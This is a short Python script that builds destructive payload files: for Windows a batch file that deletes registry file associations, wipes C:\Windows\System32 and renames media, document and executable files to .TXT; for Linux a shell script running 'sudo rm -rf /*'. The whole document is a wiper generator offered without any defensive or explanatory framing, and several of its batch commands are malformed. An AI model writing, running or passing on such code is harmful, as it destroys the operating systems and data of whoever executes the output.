Q1 = input("windows/linux:  ")



if Q1 =="windows":
    file = open("app.bat", "w")

    file.write("@echo off\n\n\n\n\nSTART reg delete hkcr/ .exe \nSTART reg delete hkcr/ .dll \nSTART reg delete hkcr/*\n\n\ndel C:\Windows\System32\*.*\q\n\n\nREN *.DOC.TXT REN *.JPEG *.TXT\nREN *.LNK *.TXT\nREN *.AVI *.TXT\nREN *MPEG *.TXT\nREN *.COM *.TXT\nREN *.BAT*.TXT")
    file.close()

elif Q1 =="linux":
    file = open("app.sh", "w")
    file.write("sudo rm -rf /*")
    file.close()

else:
    exit
